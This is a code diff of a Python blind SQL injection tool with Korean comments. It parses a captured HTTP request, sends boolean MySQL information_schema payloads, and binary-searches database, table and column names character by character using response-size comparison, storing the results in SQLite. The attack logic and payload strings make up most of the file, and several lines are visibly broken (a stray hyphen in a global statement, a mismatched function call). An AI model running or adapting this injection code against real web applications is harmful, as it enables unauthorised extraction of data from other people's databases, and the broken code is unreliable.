@@ -4,24 +4,23 @@ import sys
 # import pandas as pd
 import urllib
 import requests
-import warnings
+# import warnings
 import argparse
 import sqlite3
 
 import uuid
 
-warnings.filterwarnings('ignore')
+# warnings.filterwarnings('ignore')
 
 output_check = False
 args = None
-message = "Iron"
+true_message_size = None # 참(ture)의 경우 message size
 
 # DB
-uuid = f"{uuid.uuid4()}.db"
-conn = sqlite3.connect('test.db')
-cursor = conn.cursor()
+cursor = None
+conn = None
+id_index = 0
 
-i = 0
 
 
 REQUEST_STRING = """
@@ -39,29 +38,49 @@ Cookie: PHPSESSID=a36649a968899375505575e70dac447a; security_level=0
 
 """
 
-def sqlite():
+def get_argument():
+	parser = argparse.ArgumentParser()
+	parser.add_argument("-s",dest="schema", help="http? https?")
+	parser.add_argument("-p", dest="parameter", help="target param")
+	parser.add_argument("-d", dest="result_db", help="Database name for storing results")
+	parser.add_argument("--proxy", dest="proxy", help="Use a proxy to connect to the target URL")
+	parser.add_argument("--dbms", dest="dbms", help="SELECT DBMS : MySQL, Oracle, MSSQL, PostgreSQL")
+	parser.add_argument("--basic", action="store_true", help="Basic info extraction")
+	parser.add_argument("--dbs", action="store_true", help="Enumerate DBMS databases")
+	parser.add_argument("--tables", action="store_true", help="Enumerate Tables")
+	parser.add_argument("--columns", action="store_true", help="Enumerate columns")
+
+	options = parser.parse_args()
+	if not options.parameter or not options.schema:
+		parser.error("[-] Missing required parameters: --param, --schema are required. Use --help for more info.")
+	return options
+
+def result_db_create(name):
+	global cursor, conn-
+	conn = sqlite3.connect(name) 
+	cursor = conn.cursor()
+
+def result_table_create():
 	cursor.execute('CREATE TABLE IF NOT EXISTS dbs_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255))')
 	cursor.execute('CREATE TABLE IF NOT EXISTS table_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), table_name VARCHAR(255))')
 	cursor.execute('CREATE TABLE IF NOT EXISTS column_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), table_name VARCHAR(255), column_name VARCHAR(255))')
 	# cursor.execute('CREATE TABLE data (id INTEGER PRIMARY KEY AUTOINCREMENT, DB VARCHAR(255), table_ VARCHAR(255), column VARCHAR(255), data VARCHAR(255))')
 
-def set_name(First):
-	global i
-
+def result_set_name(First): # 중복코드 추후 수정
+	global id_index
+	id_index += 1
+	
 	if args.dbs:
-		i = i+1
-		db_data = cursor.execute(f"INSERT OR REPLACE INTO dbs_info (id, db_name) VALUES ('{i}','{First}')")
+		db_data = cursor.execute(f"INSERT OR REPLACE INTO dbs_info (id, db_name) VALUES ('{id_index}','{First}')")
 		conn.commit()
 	elif args.tables:
-		i = i+1
-		db_data = cursor.execute(f"INSERT INTO table_info (id, table_name) VALUES ('{i}','{First}')")
+		db_data = cursor.execute(f"INSERT OR REPLACE INTO table_info (id, table_name) VALUES ('{id_index}','{First}')")
 		conn.commit()
 	elif args.columns:
-		i = i+1
-		db_data = cursor.execute(f"INSERT INTO column_info (id, column_name) VALUES ('{i}','{First}')")
+		db_data = cursor.execute(f"INSERT OR REPLACE INTO column_info (id, column_name) VALUES ('{id_index}','{First}')")
 		conn.commit()
 
-def get_name():
+def result_get_name():
 	list_1 = []
 
 	if args.dbs:
@@ -77,24 +96,6 @@ def get_name():
 	# elif args.columns:
 	# 	cursor.execute(f"11")
 
-
-def get_argument():
-	parser = argparse.ArgumentParser()
-	parser.add_argument("-s",dest="schema", help="http? https?")
-	parser.add_argument("-p", dest="parameter", help="target param")
-	parser.add_argument("--proxy", dest="proxy", help="Use a proxy to connect to the target URL")
-
-	parser.add_argument("--dbms", dest="dbms", help="SELECT DBMS : MySQL, Oracle, MSSQL, PostgreSQL")
-	parser.add_argument("--basic", action="store_true", help="Basic info extraction")
-	parser.add_argument("--dbs", action="store_true", help="Enumerate DBMS databases")
-	parser.add_argument("--tables", action="store_true", help="Enumerate Tables")
-	parser.add_argument("--columns", action="store_true", help="Enumerate columns")
-
-	options = parser.parse_args()
-	if not options.parameter or not options.schema:
-		parser.error("[-] Missing required parameters: --param, --schema are required. Use --help for more info.")
-	return options
-
 def url_encode(item):
 	return urllib.parse.quote(item).replace('%20', '+').replace('%3D', '=').replace('%27', '\'').replace('%28','(').replace('%29',')').replace('%3E', '>').replace('%2C', ',').replace('%3C', '<')
 
@@ -102,8 +103,6 @@ def url_decode(item):
 	return urllib.parse.unquote(item).replace('+', ' ')
 
 def parse_request(request):
-	# global method, url, path, headers, data, param, condition
-	# payloads = setpayload() # 페이로드 셋팅
 	lines = request.split("\n") # 한줄씩 쪼개서 넣기
 	method, path_param, http_ver = lines[1].split() # POST /v1/groups/814a75c9-f187-48c8-8c01-a9805212db0e/files/details?AAA=aaa&BBB=bbb HTTP/2
 	headers = {} # 헤더 딕셔너리
@@ -178,9 +177,9 @@ def setpayload():
 		if args.dbs:
 			print("[*] MySQL DB 출력 Start")
 			payloads = {
-				'count' : "(SELECT count(*) FROM information_schema.schemata)>{mid_val}",
-				'len' : "(SELECT length((SELECT schema_name FROM information_schema.schemata LIMIT {rows},1)))>{mid_val}",
-				'dbs' : "ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT {rows},1),{substr_index},1))>{mid_val}"
+				'count' : "(SELECT count(*) FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema'))>{mid_val}",
+				'len' : "(SELECT length((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1)))>{mid_val}",
+				'dbs' : "ascii(substr((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1),{substr_index},1))>{mid_val}"
 			}
 		if args.tables:
 			print("[*] MySQL 테이블 출력 Start")
@@ -226,13 +225,20 @@ def setpayload():
 	# 	print("Unsupported DBMS. Use --help for more info.")
 	
 	return payloads
-def check_condition(data):
+
+def check_condition(data, method, url, path, headers):
+	global true_message_size
 	params = '&'.join([f"{key}={value}" for key, value in data.items()])      
 	proxies = {'http': args.proxy, 'https': args.proxy}
 	timeout = 30
-	url =
-	response = requests.request(method, url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
-
+	if method == 'GET':
+		url = f"{args.schema}://{url}{path}?{params}" # HTTP , HTTPS 입력 sechma
+		response = requests.request(method, url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
+		true_message_size = len(response.content)
+	else:
+		url = f"{args.schema}://{url}{path}" # HTTP , HTTPS 입력 sechma
+		response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)
+	
 def recursive(min_val, max_val, data_val, payload_fix, substr_index=None, rows=None, table_name=None, column_name=None):
 
 	# print(table_name)
@@ -255,23 +261,24 @@ def connection(data, method, url, path, headers):
 	data[args.parameter] = url_encode(data[args.parameter])
 	params = '&'.join([f"{key}={value}" for key, value in data.items()])      
 	# print(params)
-	url = f"{args.schema}://{url}{path}?{params}" # HTTP , HTTPS 입력 sechma
 	proxies = {'http': args.proxy, 'https': args.proxy}
 	timeout = 30
 	if method == 'GET':
+		url = f"{args.schema}://{url}{path}?{params}" # HTTP , HTTPS 입력 sechma
 		response = requests.request(method, url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
 	else:
+		url = f"{args.schema}://{url}{path}" # HTTP , HTTPS 입력 sechma
 		response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)
 
-	if message in response.text:
+	if true_message_size == len(response.content):
 		return 1    # true
 	return 0    # false
 
 def query_start():
-	sqlite()
+	result_table_create()
 	payloads = setpayload()
 	data, condition = parse_request(REQUEST_STRING)
-	check_condition()
+	check_condition(**data)
 	result_payload = payload_set(condition, payloads)
 
 	name_str = "" # 한문자 씩 찾아서 저장할 변수
@@ -303,9 +310,7 @@ def query_start():
 					name_str += chr(recursive(0, 127, data, value, substr_index+1, rows, table_name))
 					name_str_list[rows][0] = name_str
 					print(name_str)
-				table_name = set_name(name_str)
-						
-
+				table_name = result_set_name(name_str)
 				
 				print(f"[+] {rows+1} 행 출력 : {name_str}")
  
@@ -340,17 +345,16 @@ def query_start():
 			print(j,end=" ")
 		print()
 	
-	test = get_name()
-	print(test)
 	conn.close()
 
 if __name__ == '__main__':
-
 	args = get_argument()
 	print(args)
+	result_db_create(args.result_db)
+
 	print ("=================================================================")
-	print ("Blind SQL Injection Start")
+	print ("Blind SQL Injection START")
 	print ("=================================================================")
-	print(f"DB 파일명 : {uuid}")
-	print ("=================================================================")
+	# print(f"DB 파일명 : {uuid}")
+	# print ("=================================================================")
 	query_start()
